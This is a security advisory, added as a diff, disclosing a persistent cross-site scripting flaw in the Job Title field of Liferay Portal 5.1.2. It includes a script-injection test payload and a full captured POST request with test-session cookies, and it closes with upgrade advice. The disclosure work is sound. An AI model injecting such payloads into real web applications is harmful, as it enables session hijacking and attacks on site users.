@@ -1,0 +1,43 @@
+#Exploit Title: Liferay Portal 5.1.2 - Persistent XSS 
+#Discovery Date: 2016-02-10
+#Exploit Author: Sarim Kiani
+#Vendor Homepage: https://www.liferay.com
+#Software Link: https://www.liferay.com/community/releases
+#Version: 5.1.2
+#Tested on: Windows OS
+
+Liferay Portal 5.1.2 is an open source version of Liferay's enterprise web platform for building business solutions that deliver immediate results and long-term value.
+
+1. Vulnerability Description:
+
+A persistent XSS exists in "My Account" page of the application.
+
+2. Proof of Concept:
+
+Any user entering personal information in the "My Account" page of the application can insert XSS Payload in the Form.
+
+Test Payload: "><script>alert(1);</script>
+
+Parameter: _79_jobTitle
+Parameter Name: Job Title
+
+POST /user/test/home?p_p_id=79&p_p_lifecycle=1&p_p_state=maximized&p_p_mode=view&_79_struts_action=%2Fenterprise_admin%2Fedit_user HTTP/1.1
+Host: localhost:8082
+Content-Length: 2712
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost:8082
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:8082/user/test/home?p_p_id=79&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_79_struts_action=%2Fenterprise_admin%2Fedit_user&_79_redirect=http%3A%2F%2Flocalhost%3A8082%2Fuser%2Ftest%2Fhome%3Fp_p_id%3D79%26p_p_lifecycle%3D0%26p_p_state%3Dmaximized%26p_p_mode%3Dview%26_79_struts_action%3D%252Fenterprise_admin%252Fview%26_79_tabs1%3Dusers%26_79_tabs2%3D%26_79_tabs3%3D%26_79_keywords%3D%26_79_advancedSearch%3Dfalse%26_79_andOperator%3Dtrue%26_79_firstName%3D%26_79_middleName%3D%26_79_lastName%3D%26_79_screenName%3D%26_79_emailAddress%3D%26_79_active%3Dtrue%26_79_organizationId%3D0%26_79_roleId%3D0%26_79_userGroupId%3D0%26_79_cur%3D1&_79_p_u_i_d=10301
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: LFR_SESSION_STATE_10127=1459071499499; COOKIE_SUPPORT=true; JSESSIONID=F53EC8D33C0D3ED9AD62FDA0BB682201; COMPANY_ID=10106; ID=7a31746f4f4c712f4179453d; PASSWORD=4e4c77485138744d61356f3d; LOGIN=74657374406c6966657261792e636f6d; SCREEN_NAME=4e4c77485138744d61356f3d; GUEST_LANGUAGE_ID=en_US
+Connection: close
+
+_79_cmd=update&_79_tabs2=display&_79_tabs3=email-addresses&_79_tabs4=phone-numbers&_79_redirect=http%3A%2F%2Flocalhost%3A8082%2Fuser%2Ftest%2Fhome%3Fp_p_id%3D79%26p_p_lifecycle%3D0%26p_p_state%3Dmaximized%26p_p_mode%3Dview%26_79_struts_action%3D%252Fenterprise_admin%252Fedit_user%26_79_tabs2%3Ddisplay%26_79_tabs3%3Demail-addresses%26_79_tabs4%3Dphone-numbers%26_79_backURL%3Dhttp%253A%252F%252Flocalhost%253A8082%252Fuser%252Ftest%252Fhome%253Fp_p_id%253D79%2526p_p_lifecycle%253D0%2526p_p_state%253Dmaximized%2526p_p_mode%253Dview%2526_79_struts_action%253D%25252Fenterprise_admin%25252Fview%2526_79_tabs1%253Dusers%2526_79_tabs2%253D%2526_79_tabs3%253D%2526_79_keywords%253D%2526_79_advancedSearch%253Dfalse%2526_79_andOperator%253Dtrue%2526_79_firstName%253D%2526_79_middleName%253D%2526_79_lastName%253D%2526_79_screenName%253D%2526_79_emailAddress%253D%2526_79_active%253Dtrue%2526_79_organizationId%253D0%2526_79_roleId%253D0%2526_79_userGroupId%253D0%2526_79_cur%253D1%26_79_p_u_i_d%3D&_79_backURL=http%3A%2F%2Flocalhost%3A8082%2Fuser%2Ftest%2Fhome%3Fp_p_id%3D79%26p_p_lifecycle%3D0%26p_p_state%3Dmaximized%26p_p_mode%3Dview%26_79_struts_action%3D%252Fenterprise_admin%252Fview%26_79_tabs1%3Dusers%26_79_tabs2%3D%26_79_tabs3%3D%26_79_keywords%3D%26_79_advancedSearch%3Dfalse%26_79_andOperator%3Dtrue%26_79_firstName%3D%26_79_middleName%3D%26_79_lastName%3D%26_79_screenName%3D%26_79_emailAddress%3D%26_79_active%3Dtrue%26_79_organizationId%3D0%26_79_roleId%3D0%26_79_userGroupId%3D0%26_79_cur%3D1&_79_p_u_i_d=10301&_79_tabs1TabsScroll=&_79_screenName=user&_79_emailAddress=user%40xyz.com&_79_prefixId=&_79_firstName=John&_79_middleName=&_79_lastName=Hopkins&_79_suffixId=&_79_birthdayMonth=0&_79_birthdayDay=1&_79_birthdayYear=1970&_79_male=1&_79_organizationIds=&_79_organizationNames=&_79_jobTitle=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&_79_tabs2TabsScroll=&_79_languageId=en_US&_79_timeZoneId=Pacific%2FMidway&_79_greeting=Welcome+John+Hopkins%21&_79_password1=&_79_password2=&_79_passwordReset=false&_79_tabs3TabsScroll=&_79_tabs4TabsScroll=&_79_openId=&_79_smsSn=&_79_aimSn=&_79_icqSn=&_79_jabberSn=&_79_msnSn=&_79_skypeSn=&_79_ymSn=&_79_facebookSn=&_79_mySpaceSn=&_79_twitterSn=&_79_announcementsTypegeneralEmail=false&_79_announcementsTypegeneralSms=false&_79_announcementsTypegeneralWebsite=true&_79_announcementsTypegeneralWebsiteCheckbox=on&_79_announcementsTypenewsEmail=false&_79_announcementsTypenewsSms=false&_79_announcementsTypenewsWebsite=true&_79_announcementsTypenewsWebsiteCheckbox=on&_79_announcementsTypetestEmail=false&_79_announcementsTypetestSms=false&_79_announcementsTypetestWebsite=true&_79_announcementsTypetestWebsiteCheckbox=on&_79_tabs1TabsScroll=&_79_comments=
+
+3. Solution:
+
+Issue has been resolved in newer versions. Upgrade to 6.1 CE or newer.
